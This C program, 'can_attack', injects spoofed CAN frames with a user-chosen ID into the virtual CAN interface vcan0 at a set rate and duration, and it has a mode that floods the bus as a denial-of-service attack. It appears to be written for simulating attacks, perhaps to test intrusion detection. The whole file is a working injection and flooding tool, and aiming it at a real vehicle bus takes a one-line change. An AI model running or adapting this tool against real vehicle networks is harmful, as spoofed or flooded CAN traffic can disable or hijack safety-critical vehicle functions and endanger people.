/*
can_attack
Program to inject CAN packets into the virtual CAN bus to simulate an attack
*/

#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <errno.h>

#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <linux/can.h>
#include <linux/can/raw.h>

#define ARRAY_SIZE  4

/**
 * @brief printUsage
 * Prints usage error when input error occurs
 * 
 * @param error_id 
 */
void printUsage(int error_id){

    printf("can_attack injects attack to virtual CAN\n\n");

    // Logic depending on error
    printf("ERROR - ");
    switch(error_id){
       case 1: printf("Incorrect number of arguments\n\n");
       break;
       case 2: printf("Incorrect CAN ID format\n\n");
       break;
       case 3: printf("Frequency argument must be an Int\n\n");
       break;
       case 4: printf("Duration argument must be an Int\n\n");
       break;
       default: ;
   }

    printf("Usage: ./can_attack <ID> <packet_frequency> <duration>\n\n");
    printf("    - ID = ID you wish to inject\n");
    printf("    - packet_frequency = How many packets per second to inject (set to 1 for DoS)\n");
    printf("    - duration = Duration of attack in Seconds\n\n\n");
    printf("Example: ./can_attack 2F9 100 4\n\n");

}// END printUsage --------------------------------------------------------------

/**
 * @brief getTime()
 * Gets the current time in microseconds
 * 
 * @return unsigned long 
 */
unsigned long getTime(){
    struct timeval tv;
    unsigned long time_in_micros;

    gettimeofday(&tv,NULL);
    time_in_micros = 1000000 * tv.tv_sec + tv.tv_usec;

    return time_in_micros;

}

/**
 * @brief convertHex()
 * This function takes the string hex argument (for CAN ID) and converts it to 
 * a decimal for transmission over the virual CAN bus. 
 * 
 * @param hex 
 * @return int 
 */
int convertHex(char hex[ARRAY_SIZE]){

    long long base = 1;
    int i = 0, value, length;
    int decimal = 0; 

    length = strlen(hex);
    for(i = length--; i >= 0; i--)
    {
        if(hex[i] >= '0' && hex[i] <= '9')
        {
            decimal += (hex[i] - 48) * base;
            base *= 16;
        }
        else if(hex[i] >= 'A' && hex[i] <= 'F')
        {
            decimal += (hex[i] - 55) * base;
            base *= 16;
        }
        else if(hex[i] >= 'a' && hex[i] <= 'f')
        {
            decimal += (hex[i] - 87) * base;
            base *= 16;
        }
    }

    return decimal;

}// END convertHex -------------------------------------------------------------


/**
 * @brief sendAttack()
 * This function takes the converted CAN ID and injects packets with this ID
 * 
 * @param canID 
 * @param packet_frequency 
 * @return int 
 */
int sendAttack(int canID, int packet_frequency, int duration){
    int s, ret; 
	struct sockaddr_can addr;
	struct ifreq ifr;
	struct can_frame frame;
    long time_pause = 0;

	if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
		perror("Socket");
		return 1;
	}

	strcpy(ifr.ifr_name, "vcan0" );
	ioctl(s, SIOCGIFINDEX, &ifr);

	memset(&addr, 0, sizeof(addr));
	addr.can_family = AF_CAN;
	addr.can_ifindex = ifr.ifr_ifindex;

	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("Bind");
		return 1;
	}

    // Assign Can ID + Dummy Data of "Hello"
	frame.can_id = canID;
	frame.can_dlc = 8;
	sprintf(frame.data, "DEADBEEF");

    if(packet_frequency == 1){
        packet_frequency = 1000000;
        duration = 2147483647;
        printf("DoS attack enabled, press CTRL + C to quit\n\n");
    }
    // Calculate gap between messages to achieve frequency
    time_pause = (long)1000000 / (long)packet_frequency;
    
    // Inject packets
    // Duation in seconds
    for(int y = 0; y < duration; y ++){
        // injections per seconds
        for(int x = 0; x < packet_frequency; x++ ){
            if (write(s, &frame, sizeof(struct can_frame)) != sizeof(struct can_frame)) {
            perror("Write");
            return 1;
            }
            if(time_pause == 1)continue;
             do {
                ret = usleep(time_pause);
            } while (ret && errno == EINTR);
        }
    }

	if (close(s) < 0) {
		perror("Close");
		return 1;
	}
    
    return 0;

}// END sendAttack -------------------------------------------------------------


int main(int argc, char *argv[]){
    char hex[ARRAY_SIZE];
    int decimal_id = 0;
    int packet_frequency = 0, duration = 0;
    int packet_success = 0;

    // If not 3 arguments (ID + attack frequency + attack duration)
    if(argc != 4){
        printUsage(1);
        return 1;
    }
    // If ID input isnt 3 characters
    if(strlen(argv[1]) != 3){
        printUsage(2);
        return 1;
    }
    // Check if frequency input is integer
    if(!atoi(argv[2])){
        printUsage(3);
        return 1;
    }
    // Check if duration input is integer
    if(!atoi(argv[3])){
        printUsage(4);
        return 1;
    }

    // Assign Values
    decimal_id = convertHex(argv[1]);
    packet_frequency = atoi(argv[2]);
    duration = atoi(argv[3]);

    // Set DoS value
    if(duration == 0){
        duration=10000;
    }

    // Start Attack
    printf("\nInjecting %d packets a second, for %d Seconds\n", packet_frequency, duration);
    printf("Packet ID = %s\n\n", argv[1]);
    
    fprintf(stdout, "Timestamp - %lu\n\n", getTime());

    packet_success = sendAttack(decimal_id, packet_frequency, duration);

    if(packet_success != 0){
        return 1;
    }

    
    return 0;
}
